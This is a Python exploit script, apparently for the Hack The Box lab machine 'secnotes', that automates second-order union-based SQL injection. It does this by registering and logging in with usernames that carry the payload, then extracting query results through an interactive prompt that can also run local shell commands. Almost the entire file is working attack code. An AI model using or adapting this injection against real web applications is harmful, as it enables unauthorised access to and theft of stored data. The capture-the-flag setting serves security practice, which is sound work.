#!/usr/bin/env python

import requests
import sys
import os
import re
import stat

# Tested on Python >2.7

# Second order union based SQL injection on 10.10.10.97 "secnotes" /register.php and /login.php
# It's not very useful for owning the box, I wrote it for fun :)

# This script injects user input as payload to collumn that controls some part of output text and grep only that part. Provides shell-like experience

# Ex. user(), database(), @@version

# ---- help and colors ---- #

class bcolors:
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	ENDC = '\033[0m'

def pgreen(t):
	print(bcolors.GREEN + t + bcolors.ENDC)
def pblue(t):
	print(bcolors.BLUE + "   " + t + bcolors.ENDC)
def pspec(t):
	print("- " + bcolors.YELLOW + t +  " -" + bcolors.ENDC)
def debug(t):
	print(bcolors.BLUE + "> " + t + bcolors.ENDC)
def err(t):
	print(bcolors.RED + "!> " + t + bcolors.ENDC)

pgreen("Second order union based SQL injection on HTB 10.10.10.97 'secnotes' /register.php and /login.php")
pblue("For ex. type user() to get current user")
pgreen("To use certain database type 'use <dbname>'")
pblue("Ex. use users")

if len(sys.argv) > 1:
	if sys.argv[1] == "-h":
		pgreen("You can only select 1 row at the time so use offset if you need")
		pblue("Ex. offset 2")
		pgreen("Invoke shell commands after /")
		pblue("Ex. /clear")
		pspec("Exploit by brun0ne, enjoy =)")
		sys.exit()

pgreen("For more detailed help -h")
pspec("Exploit by brun0ne, enjoy =)")
print("")

# ---- checks ---- #

this = os.stat(sys.argv[0])
if this.st_mode & stat.S_ISUID != 0:
	err("WARNING! SUID bit on this script is not secure!")

# ---- EXPLOIT ---- #

url = "http://10.10.10.97"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

s = requests.Session()

def main():
	append = ""
	limit = "0" # 0 is off
	offset = "0"

	while 1:
		if sys.version_info[0] == 2:
			cmd = raw_input("> ")
		elif sys.version_info[0] == 3:
			cmd = input("> ")

		if cmd == "":
			continue
		
		if cmd[:4] == "use ":
			if cmd[4:] != "":
				append = " from " + cmd[4:]
				print("using database: " + cmd[4:])
			else:
				append = ""
				print("not using database")
			continue
		elif cmd[:6] == "limit ":
			limit = cmd[6:]
			print("limit set to: " + cmd[6:])
			continue
		elif cmd[:7] == "offset ":
			offset = cmd[7:]
			print("offset set to: " + cmd[7:])
			continue
		elif cmd[0] == "/":
			os.system(cmd[1:])
			continue
		
		payload = "'union select 1,2,3," + cmd + append
		if limit != "0":
			payload += " limit " + limit
		if offset != "0":
			payload += " offset " + offset
		payload += "-- -"
		
		# it has limit of length (50 chars)
		if len(payload) > 50:
			print("[too long payload] # " + str(abs(50 - len(payload))) + " extra char(s)")
			continue

		debug("full query: SELECT * FROM secnotes WHERE z='" + payload + "'")

		d1 = {"username": payload, "password": "111111", "confirm_password": "111111"}
		d2 = {"username": payload, "password": "111111"}
		
		# register
		try:
			s.post(url + "/register.php", data=d1, headers=headers)
		except:
			err("register.php error")
		
		# login (execute)
		try:
			res = s.post(url + "/login.php", data=d2, headers=headers)
		except:
			err("login.php error")
		else:	
			# print only payloaded column
			try:
				var = res.text.partition("[")[2].partition("]")[0]

				if var == "i": # nothing, but no error
					print("[empty]")
				elif var == "": # wrong query, status code 500
					print("[query error]")
				else:
					print(var) # OK
			except:
				err("weird stuff happened") # some critical error
		
		# logout
		try:
			res = s.post(url + "/logout.php")
		except:
			err("logout.php error")
	sys.exit()

# ----

try:
	main()
except KeyboardInterrupt:
	print("\nExiting...")
	sys.exit()


